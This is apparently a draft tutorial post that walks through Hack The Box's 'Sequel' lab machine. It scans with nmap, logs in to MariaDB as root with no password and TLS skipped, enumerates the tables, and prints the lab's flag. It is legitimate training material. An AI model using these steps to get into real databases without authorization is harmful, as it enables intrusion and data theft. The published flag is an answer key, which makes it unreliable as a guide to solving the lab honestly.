---
title: "Navigating MariaDB on HTB’s ‘Sequel’ Box to Retrieve the Flag"
published: false
tags: [hackthebox, mysql, mariadb, pentesting, tutorial]
---

## Introduction

In this guide, we’ll connect directly to the MariaDB instance on Hack The Box’s **Sequel** machine, enumerate its databases, tables, and extract the flag.

**You’ll learn to:**
- Discover database services with `nmap`  
- Authenticate to MariaDB, including dealing with TLS issues  
- List databases and tables with SQL commands  
- Query tables to retrieve sensitive data (the flag)  

## Prerequisites

- Kali Linux (or any distro with `mysql-client`)  
- Active HTB VPN connection  

---

## 1. Scan for MySQL/MariaDB Service

Identify open database port:

```bash
nmap -sC -sV 10.129.28.113 -oN nmap-3306.txt
```

<details>
<summary>Output snippet</summary>

```text
3306/tcp open  mysql?  MariaDB 10.3.27
```
</details>

---

## 2. Connect to the Database

Bypass TLS requirement in the MariaDB client:

```bash
mysql --ssl -h 10.129.28.113 -u root --skip-ssl
```

---

## 3. Enumerate Databases & Tables

List available databases:

```sql
SHOW DATABASES;
```

Select the target database:

```sql
USE htb;
```

List tables:

```sql
SHOW TABLES;
```

---

## 4. Retrieve the Flag

Inspect the `config` table for the flag:

```sql
SELECT * FROM config;
```

The `value` column for `name = 'flag'` contains:

```
7b4bec00d1a39e3dd4e021ec3d915da8
```

---

## 5. Automation Script

Automate enumeration with `scripts/enum-mysql.sh`:

```bash
bash scripts/enum-mysql.sh 10.129.28.113
```

---

## 6. Lessons Learned

- Direct database access can bypass web app filters.  
- MariaDB often enforces TLS by default—be prepared to adjust client flags.  
- Standard SQL commands (`SHOW DATABASES`, `SHOW TABLES`) quickly reveal sensitive tables.  

---

🔗 **Full tutorial & repo:** https://github.com/keyfive5/obsidiansignal-htb-sequel  
